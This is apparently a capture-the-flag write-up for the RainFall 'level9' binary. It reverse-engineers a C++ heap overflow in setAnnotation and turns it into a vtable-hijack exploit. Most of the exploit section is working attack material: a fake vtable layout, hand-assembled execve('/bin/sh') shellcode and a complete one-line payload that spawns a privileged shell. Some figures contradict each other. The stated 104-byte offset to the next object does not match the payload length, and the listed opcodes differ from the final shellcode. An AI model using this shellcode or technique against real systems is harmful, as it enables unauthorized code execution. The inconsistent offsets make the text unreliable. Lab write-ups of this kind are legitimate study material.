first of all i run the program :

```bash
level9@RainFall:~$ ./level9
level9@RainFall:~$ echo $?
1
```

there is nothing happen, the program immediately exit with status code 1.

i try again with an argument :

```bash
level9@RainFall:~$ ./level9 AAAA
level9@RainFall:~$ echo $?
11
```

now the program crash.

i try with a much larger input :

```bash
level9@RainFall:~$ ./level9 $(python -c 'print "A"*200')
Segmentation fault (core dumped)
```

interesting.

the only thing i control is `argv[1]`, therefore the crash is probably related to data copied from the first argument.

---

## Disassembling main

i start by inspecting the main function :

```bash
echo 'disas main' | gdb level9
```

the beginning of the function contains a check on argc :

```asm
cmpl   $0x1,0x8(%ebp)
jg     0x8048610
movl   $0x1,(%esp)
call   _exit@plt
```

equiivalent code :

```cpp
if (argc <= 1)
    exit(1);
```

this explains the status code observed during the first execution.

---

## First allocation

after the argc check i find :

```asm
movl   $0x6c,(%esp)
call   _Znwj@plt
```

the symbol `_Znwj` is the C++ `new` operator.

demangling :

```text
_Z -> C++ symbol
nw -> operator new
j  -> unsigned int
```

equiivalent prototype :

```cpp
void *operator new(unsigned int size);
```

therefore :

```asm
movl   $0x6c,(%esp)
call   _Znwj@plt
```

means :

```cpp
operator new(0x6c);
```

or :

```cpp
new N(...);
```

the allocated size is :

```text
0x6c = 108 bytes
```

---

## Constructor call

immediately after the allocation :

```asm
mov    %eax,%ebx
movl   $0x5,0x4(%esp)
mov    %ebx,(%esp)
call   _ZN1NC2Ei
```

the symbol :

```text
_ZN1NC2Ei
```

can be demangled as :

```text
_Z      -> C++ symbol
N ... E -> nested name
1N      -> class name "N"
C2      -> constructor
i       -> int parameter
```

equivalent to :

```cpp
N::N(int)
```

the calling convention used by g++ passes :

```text
[esp]   = this
[esp+4] = constructor argument
```

therefore :

```asm
movl   $0x5,0x4(%esp)
```

passes :

```cpp
5
```

to the constructor.

equiivalent code :

```cpp
N *a = new N(5);
```

---

## Second allocation

a few instructions later the exact same pattern appears :

```asm
movl   $0x6c,(%esp)
call   _Znwj@plt

movl   $0x6,0x4(%esp)
mov    %ebx,(%esp)
call   _ZN1NC2Ei
```

equiivalent code :

```cpp
N *b = new N(6);
```

at this point i know there are two objects allocated consecutively on the heap :

```text
+------------+
| object a   |
+------------+
| object b   |
+------------+
```

each object occupies :

```text
108 bytes
```

---

## after that i inspect the constructor:

```asm
080486f6 <_ZN1NC1Ei>:
   push   %ebp
   mov    %esp,%ebp
   mov    0x8(%ebp),%eax
   movl   $0x8048848,(%eax)
   mov    0x8(%ebp),%eax
   mov    0xc(%ebp),%edx
   mov    %edx,0x68(%eax)
   pop    %ebp
   ret
```

the first instruction stores :

```text
0x8048848
```

eax is (this) poiter to the obj.

So it's writing a constant address at offset 0 of the object:
```cpp
*(void **)this = 0x8048848;
```

this is the virtual table pointer, The compiler automatically inserts it into the constructor.

equiivalent code :

```cpp
this->vptr = 0x8048848;
```

the second part stores the constructor argument at offset :

```text
0x68
```

equiivalent code :

```cpp
this->value = n;
```

from this i can reconstruct most of the class layout :

```cpp
class N
{
    virtual fuction

    int value;
};
```

After creating the two objects, the program retrieves `argv[1]` and passes it to `setAnnotation()`.

```asm
mov    0xc(%ebp),%eax
add    $0x4,%eax
mov    (%eax),%eax
mov    %eax,0x4(%esp)
mov    0x14(%esp),%eax
mov    %eax,(%esp)
call   _ZN1N13setAnnotationEPc
```

Equivalent:

```cpp
obj1->setAnnotation(argv[1]);
```

---

## Analyzing setAnnotation()

```asm
mov    0xc(%ebp),%eax
call   strlen@plt
```

Gets the length of the user input:

```cpp
size = strlen(argv[1]);
```

---

```asm
mov    0x8(%ebp),%edx
add    $0x4,%edx
```

Loads the object pointer and moves 4 bytes forward:

```cpp
dest = this + 4;
```

Since offset `0x00` contains the vptr:

```text
offset 0x00 -> vptr
offset 0x04 -> annotation
```

the copy destination is the annotation buffer.

---

Finally:

```asm
call   memcpy@plt
```

Equivalent:

```cpp
memcpy(annotation, argv[1], strlen(argv[1]));
```

---

## Vulnerability

The copy size is entirely controlled by the user:

```cpp
strlen(argv[1])
```

and no size check is performed.

This allows writing past the end of the annotation buffer and overflowing into the next heap object.

layout :

```text
offset  content
------  -------
0x00    vptr
0x04    annotation
0x68    value
```

total size :

```text
4 + 100 + 4 = 108 bytes
```

which perfectly matches the allocation size `0x6c`.

---

## Finding the target

therefore after 108 bytes the overflow reaches object b.

visualization :

```text
Object A (108 bytes / 0x6c)

0x804a008
+--------------------+
| 0x00 : vptr        | 4 bytes
+--------------------+
| 0x04 : annotation  |
|        ...         | 100 bytes
| 0x67 : annotation  |
+--------------------+
| 0x68 : value       | 4 bytes
+--------------------+
0x804a074

Object B starts here

0x804a074
+--------------------+
| 0x00 : vptr        |
+--------------------+
| 0x04 : annotation  |
|        ...         |
+--------------------+
| 0x68 : value       |
+--------------------+
```

exactly fills object a after the start of annotation.

the next bytes overwrite object b.

---

## Why object b ?

near the end of main :

```asm
mov    0x10(%esp),%eax
mov    (%eax),%eax
mov    (%eax),%edx
call   *%edx
```

this is not a normal function call.

the processor :

```text
1. reads object b vptr
2. reads first function pointer from the vtable
3. jumps to it
```

equiivalent code :

```cpp
b->virtual_function(*a);
```

or another virtual method.

the important part is :

```asm
call *%edx
```

the destination is taken from memory.

if we control the vtable pointer, we control the destination of the call.

---

## Confirming the overflow

i set a breakpoint before the virtual call :

```bash
(gdb) b *0x0804867c
(gdb) run $(python -c 'print "A"*200')
```

then inspect the heap :

```bash
(gdb) x/40wx *(void**)($esp+0x14)
```

result :

```text
0x804a008: 0x08048848 0x41414141 0x41414141 ...
```

the first dword is the original vtable pointer.

everything after it is controlled by my input.

the 200-byte payload extends far enough to overwrite object b.

---
## Understanding the Exploitation Strategy

From the constructor and `setAnnotation()` analysis we reconstructed the object layout:

```text
Object A (0x6c bytes)

0x00  vptr
0x04  annotation[100]
...
0x67  annotation end
0x68  value

Object B starts immediately after A

0x00  vptr
0x04  annotation[100]
...
0x68  value
```

The vulnerable copy is:

```cpp
memcpy(annotation, argv[1], strlen(argv[1]));
```

No boundary check is performed, therefore the user can write past the end of `annotation`.

The distance between the beginning of `annotation` and the beginning of Object B is:

```text
0x6c - 0x04 = 0x68
```

```text
104 bytes
```

Therefore after writing 104 bytes, the next bytes overwrite the virtual table pointer of Object B.

---

the program calls a virtual method on N2 right after copying my string, the CPU performs a specific lookup chain:

```asm
mov    (%eax),%eax
mov    (%eax),%edx
call   *%edx
```

Equivalent logic:

```cpp
b->vptr[0]();
```

The virtual call eventually executes a legitimate class method.

---

## Using the Virtual Table Hijacking method we can now Building a Fake vtable

The binary protections are:

```text
NX disabled
ASLR disabled
```

- Shellcode can be executed directly from memory.
- Heap addresses remain predictable between executions.

Since the overflow gives full control over the memory stored in `annotation`, we can place a fake virtual table there.
The first entry of the fake vtable is set to the address of the shellcode.
the processor loads the shellcode address and jumps to it.

Conceptually:

```text
annotation buffer

        +------------------+
    +-->| fake vtable      |---|
    |   +------------------+   |
    |   | shellcode        |<--+
    |   +------------------+
    |   | padding          |
    |   +------------------+
    +---| overwritten vptr |
        +------------------+
```

```text
Address :   0x0804a00c            0x0804a010                 ...                0x0804a074
            +---------------------+--------------------------+------------------+------------------+
            | fake vtable (4B)    | shellcode (24B)          | padding (80B)    | Object B vptr    |
            +---------------------+--------------------------+------------------+------------------+
Value   :   | 0x0804a010          | <shellcode bytes>        | "A" * n          | 0x0804a00c       |
            +---------------------+--------------------------+------------------+------------------+    
```
---

now the exploit input will be :
```bash
./level9 "0x0804a010" + shellcode + "A"*n + "0x0804a00c"
```

now i need to decode assemly instructions as opcode hex to exec "/bin/sh" to get bonus0 user access

```cpp
execve("/bin/sh", NULL, NULL)
```

sumilar to :

```
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push eax
push ebx
mov ecx, esp
xor edx, edx
mov al, 11
int 0x80
```

convet these instructions to Opcode Hex using the opcode table (i386) we get:

sed 's/../\\x&/g'

```text
xor eax, eax      ->  \x31\xc0
push eax          ->  \x50
push 0x68732f2f   ->  \x68\x2f\x2f\x73\x68
push 0x6e69622f   ->  \x68\x2f\x62\x69\x6e
mov ebx, esp      ->  \x89\xe3
push eax          ->  \x50
push ebx          ->  \x53
mov ecx, esp      ->  \x89\xe1
xor edx, edx      ->  \x31\xd2
mov al, 11        ->  \xb0\x0b
int 0x80          ->  \xcd\x80
```

so:

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

and,

n = sizeof(annotation) - sizeof(fake vtable) - strlen(shellcode)

finaly :

```bash
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A"*(108-4-24) + "\x0c\xa0\x04\x08"')
```